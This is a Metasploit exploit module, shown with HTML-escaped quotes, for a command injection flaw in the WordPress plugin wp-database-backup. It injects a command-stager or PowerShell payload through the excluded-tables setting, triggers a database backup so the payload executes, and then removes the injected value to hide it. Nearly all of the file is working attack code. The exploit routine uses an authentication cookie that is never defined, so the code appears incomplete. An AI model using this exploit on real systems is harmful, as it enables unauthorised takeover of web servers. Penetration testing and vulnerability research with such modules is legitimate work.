# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WP Database Backup RCE&#039;,
      &#039;Description&#039;    => %q(
        `wp-database-backup` for versions < 5.2.

        For the backup functionality, the plugin generates a `mysqldump` command
        to execute. The user can choose specific tables to exclude from the backup
        by setting the `wp_db_exclude_table` parameter in a POST request to the
        `wp-database-backup` page. The names of the excluded tables are included in
        the `mysqldump` command unsanitized. Arbitrary commands injected through the
        `wp_db_exclude_table` parameter are executed each time the functionality
        for creating a new database backup are run.

        Authentication is required to successfully exploit this vulnerability.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Mikey Veenstra / Wordfence&#039;,  # Vulnerability Discovery
        &#039;Shelby Pace&#039;                  # Metasploit module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.wordfence.com/blog/2019/05/os-command-injection-vulnerability-patched-in-wp-database-backup-plugin/&#039; ],
        ],
      &#039;Platform&#039;       => [ &#039;win&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Windows&#039;,
            {
              &#039;Platform&#039;        => &#039;win&#039;,
              &#039;Arch&#039;            => [ ARCH_X86, ARCH_X64 ]
            }
          ],
          [
            &#039;Linux&#039;,
            {
              &#039;Platform&#039;        =>  &#039;linux&#039;,
              &#039;Arch&#039;            =>  [ ARCH_X86, ARCH_X64 ],
              &#039;CmdStagerFlavor&#039; =>  &#039;printf&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;2019-04-24&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
    ])
  end

  def check

    changelog_uri = normalize_uri(target_uri.path, &#039;wp-content&#039;, &#039;plugins&#039;, &#039;wp-database-backup&#039;, &#039;readme.txt&#039;)
    res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  changelog_uri
    )

    if res && res.code == 200
      version = res.body.match(/=+\s(\d+\.\d+)\.?\d*\s=/)
      return CheckCode::Detected unless version && version.length > 1

      vprint_status("Version of wp-database-backup detected: #{version[1]}")
      return CheckCode::Appears if Gem::Version.new(version[1]) < Gem::Version.new(&#039;5.2&#039;)
    end
    CheckCode::Safe
  end

  def exploit

    res = create_exclude_table(cookie)
    nonce = get_nonce(res)
    create_backup(cookie, nonce)

    clear_exclude_table(cookie)
  end

  def create_exclude_table(cookie)
    @exclude_uri = normalize_uri(target_uri.path, &#039;wp-admin&#039;, &#039;tools.php&#039;)
    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;GET&#039;,
      &#039;uri&#039;       =>  @exclude_uri,
      &#039;cookie&#039;    =>  cookie,
      &#039;vars_get&#039;  =>  { &#039;page&#039;  =>  &#039;wp-database-backup&#039; }
    )

    fail_with(Failure::NotFound, &#039;Unable to reach the wp-database-backup settings page&#039;) unless res && res.code == 200
    print_good(&#039;Reached the wp-database-backup settings page&#039;)
    if datastore[&#039;TARGET&#039;] == 1
      comm_payload = generate_cmdstager(concat_operator: &#039; && &#039;, temp: &#039;./&#039;)
      comm_payload = comm_payload.join(&#039;&&&#039;)
      comm_payload = comm_payload.gsub(&#039;\&#039;&#039;, &#039;&#039;)
      comm_payload = "; #{comm_payload} ;"
    else
      comm_payload = " & #{cmd_psh_payload(payload.encoded, payload.arch, remove_comspec: true, encode_final_payload: true)} & ::"
    end

    table_res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  @exclude_uri,
      &#039;cookie&#039;    =>  cookie,
      &#039;vars_post&#039; =>
      {
        &#039;wpsetting&#039;                       =>  &#039;Save&#039;,
        &#039;wp_db_exclude_table[wp_comment]&#039; =>  comm_payload
      }
    )

    fail_with(Failure::UnexpectedReply, &#039;Failed to submit payload as an excluded table&#039;) unless table_res && table_res.code
    print_good(&#039;Successfully added payload as an excluded table&#039;)

    res.get_html_document
  end

  def get_nonce(response)
    fail_with(Failure::UnexpectedReply, &#039;Failed to get a proper response&#039;) unless response

    div_res = response.at(&#039;p[@class="submit"]&#039;)
    fail_with(Failure::NotFound, &#039;Failed to find the element containing the nonce&#039;) unless div_res

    wpnonce = div_res.to_s.match(/_wpnonce=([0-9a-z]*)/)
    fail_with(Failure::NotFound, &#039;Failed to retrieve the wpnonce&#039;) unless wpnonce && wpnonce.length > 1

    wpnonce[1]
  end

  def create_backup(cookie, nonce)
    first_res = send_request_cgi(
      &#039;method&#039;    =>  &#039;GET&#039;,
      &#039;uri&#039;       =>  @exclude_uri,
      &#039;cookie&#039;    =>  cookie,
      &#039;vars_get&#039;  =>
      {
        &#039;page&#039;      =>  &#039;wp-database-backup&#039;,
        &#039;_wpnonce&#039;  =>  nonce,
        &#039;action&#039;    =>  &#039;createdbbackup&#039;
      }
    )

    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;GET&#039;,
      &#039;uri&#039;       =>  @exclude_uri,
      &#039;cookie&#039;    =>  cookie,
      &#039;vars_get&#039;  =>
      {
        &#039;page&#039;          =>  &#039;wp-database-backup&#039;,
        &#039;notification&#039;  =>  &#039;create&#039;
      }
    )

    fail_with(Failure::UnexpectedReply, &#039;Failed to create database backup&#039;) unless res && res.code == 200 && res.body.include?(&#039;Database Backup Created Successfully&#039;)
    print_good(&#039;Successfully created a backup of the database&#039;)
  end

  def clear_exclude_table(cookie)
    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  @exclude_uri,
      &#039;cookie&#039;    =>  cookie,
      &#039;vars_post&#039; =>
      {
        &#039;wpsetting&#039;                       =>  &#039;Save&#039;,
        &#039;wp_db_exclude_table[wp_comment]&#039; =>  &#039;wp_comment&#039;
      }
    )

   fail_with(Failure::UnexpectedReply, &#039;Failed to delete the remove the payload from the excluded tables&#039;) unless res && res.code == 200
   print_good(&#039;Successfully deleted the payload from the excluded tables list&#039;)
  end
end

